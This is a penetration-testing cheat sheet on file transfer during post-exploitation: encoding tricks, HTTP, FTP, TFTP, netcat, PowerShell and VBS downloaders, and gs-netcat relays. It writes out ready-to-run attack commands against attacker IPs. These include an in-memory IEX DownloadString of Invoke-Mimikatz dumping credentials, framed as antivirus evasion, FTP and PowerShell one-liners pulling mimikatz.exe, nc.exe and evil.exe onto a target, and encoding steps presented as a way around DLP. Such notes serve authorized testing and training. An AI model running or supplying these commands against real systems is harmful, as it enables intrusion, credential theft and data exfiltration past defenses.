# File Transfer

## **Guides and Resources**

* [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
* [https://awakened1712.github.io/oscp/oscp-transfer-files/](https://awakened1712.github.io/oscp/oscp-transfer-files/)
* [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples)
* [DNSFTP](https://github.com/breenmachine/dnsftp) - Get file with DNS requests&#x20;
* [https://linuxhandbook.com/transfer-files-ssh/](https://linuxhandbook.com/transfer-files-ssh/)
* [https://xapax.github.io/security/#transferring\_files/transfering\_files/](https://xapax.github.io/security/#transferring\_files/transfering\_files/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/)

## Encode a file

DLP sucks

* Linux with base64

```
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

* Windows with certutil

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

* **File Encoding - uuencode**

Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).

Encode:

```
$ uuencode /etc/issue.net issue.net-COPY
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

Cut & paste the output (4 lines, starting with 'being 644 ...') into this command: Decode:

```
$ uudecode
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

* **File Encoding - openssl**

Openssl can be used when uu/decode/encode is not available on the remote system:

Encode:

```
$ openssl base64 </etc/issue.net
VWJ1bnR1IDE4LjA0LjIgTFRTCg==
```

Cut & paste the output into this command:

```
$ openssl base64 -d >issue.net-COPY
```

* **File Encoding - xxd**

..and if neither _uuencode_ nor _openssl_ is available then we have to dig a bit deeper in our trick box and use _xxd_.

Encode:

```
$ xxd -p </etc/issue.net
726f6f743a783a303a30...
```

Cut & paste the output into this command: Decode:

```
$ xxd -p -r >issue.net-COPY
```

* **File Encoding - Multiple Binaries**

Method 1: Using _shar_ to create a self extracting shell script with binaries inside:

```
shar *.png *.c >stuff.shar
```

Transfer _stuff.shar_ to the remote system and execute it:

```
chmod 700 stuff.shar
./stuff.shar
```

Method 2: Using _tar_

```
tar cfz - *.png *.c | openssl base64 >stuff.tgz.b64
```

Transfer _stuff.tgz.b64_ to the remote system and execute:

```
openssl base64 -d <stuff.tgz.b64 | tar xfz -
```

## HTTP/HTTPS

Find a directory on target you can write to.

```
# find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```

### Wget - Grab URL

```
(Linux) Uses HTTP and FTP
# wget http://<url> -O url.txt -o /dev/null

(Windows) wget script
> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

### Curl - Grab URL

Can transfer with IMAP, POP3, SCP, SFTP, SMB, SMTP, TELNET, TFTP< and others

```
# curl -o file.txt http://url.com
```

### SimpleHTTPServer

[SimpleHTTPServerWithUpload](https://gist.github.com/UniIsland/3346170)

* SimpleHTTPServer is a Python module which allows you to instantly create a web server in the current working directory. Not only is it useful for web developers to test their websites locally without having to worry about javascript errors, it can be a useful tool for pentesters when dealing with web applications.
* The default port number SimpleHTTPServer uses is 8000; however, you can use any arbitrary port number by simply specifying the desired port after running the command. The Kali instance used within this lab defaults to python 3. In order to run SimpleHTTPServer use the following syntax:#
  * python3 -m SimpleHTTPServer 1234
* This will enable you to access the current working directory in a web browser on the standard port 8000 at the host IP address. (You can visit the directory in a browser on the User machine using the Kali IP address.)
* It is worth noting, that there are two different modules that have the same function.
* SimpleHTTPServer is a module that is compatible with Python v2.7. Python v3.0 has a newer version of the SimpleHTTPServer module which operates the same way; this is named http.Server.
  * \#python -m http.server 1234
* Actions with the server
  * You can make a simple http web request to pull down any files you need from your target, and they appear as simple web requests.
  * Antivirus will scan the disk of your target regularly and block any files that you download on to it, if they are flagged as a virus. You can Bypass this by invoking a powershell command call to pull a remote file directly into memory
    * \> IEX (New-Object Net.WebClient).DownloadString('http://\[attacker IP]/\[target powershell script]');\[New Powershell Command]
      * IEX - pull directly into memory
      * Net.WebClient - Needed to run the DownloadString function
    * Example:
      * \> IEX(New-Object Net.WebClient).DownloadString('http://10.102.10.91:1234/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
  * Set up a simple HTTP server and pull files from it on to target
    * (Attacker) # python -m [SimpleHTTPServer](https://app.gitbook.com/s/-MQCNQTNhvnXD58Vo8Mf/red-offensive/The\_Red\_Notebook--ToolBox--SimpleHTTPServer.html) 80
    * (Target) # wget [http://attackerip/file](http://attackerip/file)

### HTTPS Server

```
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443
​
import BaseHTTPServer, SimpleHTTPServer
import ssl
​
httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

## SMB

* `\\[IP OF SUPPORT INSTANCE]\C$` in the address bar

## FTP

### Python Server

```
#pip3 install pyftpdlib
#python3 -m pyftpdlib -p 21
```

### NodeJS Server

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### Pure-FTP Server

```
# sudo apt update && sudo apt install pure-ftpd
```

Config Script

```
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### WIndows Client

```
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## TFTP

* \# In Kali #atftpd --daemon --port 69 /tftp
* \# In reverse shell #tftp -i 10.10.10.10 GET nc.exe
* Upload with TFTP
  * \# sudo apt update && sudo apt install atftp
  * \# sudo mkdir /tftp
  * \# sudo chown nobody: /tftp
  * \# sudo atftpd --daemon --port 69 /tftp
  * \# tftp -i 10.11.0.4 put important.docx

## SCP

```
Get file
# scp user@<remoteip>:/tmp/file /tmp/file

Put file
# scp /tmp/file user@<remoteIP>:/tmp/file
```

## Windows xcopy

```
> xcopy /s \\<ip>\dir C:\local
```

## NetCat from target

```
(Target) # nc -nvlp 55555 > file
(Attacker) # nc [target] 55555 < file
```

## Non-interactive shell

* Most netcat like tools provide a non-interactive shell, little to no feedback. File tranfer tools generally do not work.
* Upgrading a shell
  * Python interpreter coes with a standard module called pty for creating pseudo-terminals. We can spawn a separate process form our remote shell to get a fully interactive shell
  * \# nc -vn 10.11.0.128 4444
  * \# python -c 'import pty; pty.spawn("/bin/bash")'
* Non-interactive FTP download
  * \# sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
  * \# ls /ftphome/
  * \# sudo systemctl restart pure-ftpd
  * Next we build a text file of FTP commands we wish to execute
    * \> echo open 10.11.0.4 21> ftp.txt
    * \> echo USER offsec>> ftp.txt
    * \> echo lab>> ftp.txt
    * \> echo bin >> ftp.txt
    * \> echo GET nc.exe >> ftp.txt
    * \> echo bye >> ftp.txt
  * Initiate FTP session using the command list
    * \> ftp -v -n -s:ftp.txt
  * \> nc.exe

## Powershell

* Simple Powershell download
  * For more modern windows versions, we can use PowerShell as an even simpler download alternative, System.Net.WebClient class
    * \>echo $webclient = New-Object System.Net.WebClient >>wget.ps1
    * \>echo $url = "[http://10.11.0.4/evil.exe"](http://10.11.0.4/evil.exe) >>wget.ps1
    * \>echo $file = "new-exploit.exe" >>wget.ps1
    * \>echo $webclient.DownloadFile($url,$file) >>wget.ps1
  * Now we can run the script and download our file
    * \> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
  * \*\*\*One liner version\*\*\*
    * \> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
* Downloads with exe2hex and Powershell
  * With this method we will compress a binary, convert it to hex, and then embed it in a windows script.
  * On the target machine we will paste teh script into the shell then run it.
  * Start with locating the nc.exe binary on Kali and compress it
    * \# locate nc.exe | grep binaries
    * \# cp /usr/share/windows-resources/binaries/nc.exe
    * \# ls -lh nc.exe
    * \# upx -9 nc.exe #upx isa PE compression tool
    * \# ls -lh nc.exe
  * Next we conver it to hex
    * \# exe2hex -x nc.exe -p nc.cmd
  * Now when we copy and paste the script into a shell on our windows device, it will create a perfectly working copy of nc.exe

## Uploads with windows scripting languages

* We can use the System.Net.WebClient powershell class to upload data to our kali machine with an HTTP POST request
* With this we will make a php script in /var/www/html
  * \<?php\
    &#x20;$uploaddir = '/var/www/uploads/';\
    &#x20;$uploadfile = $uploaddir . $\_FILES\['file']\['name'];\
    &#x20;move\_uploaded\_file($\_FILES\['file']\['tmp\_name'], $uploadfile)\
    &#x20;?>
* PHP code in Listing 490 will process an incoming file upload request and save the data to that directory
* Next we create the uploads folder and modify it permissions graning the www-data user ownership and subsequent write permissions
  * \#sudo mkdir /var/www/uploads
  * \#ps -ef | grep apache
  * \#sudo chown www-data: /var/www/uploads
  * \#ls -la
* With Apache and the php script ready we move to our compromised windows host and invoke the up

## WGET.VBS

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs 
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs 
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge t.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget. vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs echo http.Send >> wget.vbs 
echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs 
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs echo strData = "" >> wget.vbs 
echo strBuffer = "" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs echo ts.Close >> wget.vbs
```

## **File transfer - using **_**screen**_** from REMOTE to LOCAL**

Transfer a file FROM the remote system to your local system:

Have a _screen_ running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use _openssl_ to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and _screen_ will write this data to _screen-xfer.txt_:

```
openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H

On your local computer and from a different shell decode the file:

```
openssl base64 -d <screen-xfer.txt
rm -rf screen-xfer.txt
```

### **File transfer - using **_**screen**_** from LOCAL to REMOTE**

On your local system (from within a different shell) encode the data:

```
openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current _screen_):

```
openssl base64 -d
```

Get _screen_ to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

## **File transfer - using gs-netcat and sftp**

Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. It uses the Global Socket Relay Network and no central server or IP address is required to connect to the SFTP/Gsocket server (just a password hash).

```
gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host
```

From your workstation execute this command to connect to the SFTP server:

```
export GSOCKET_ARGS="-s MySecret"                        # Workstation
sftp -D gs-netcat                                        # Workstation
```
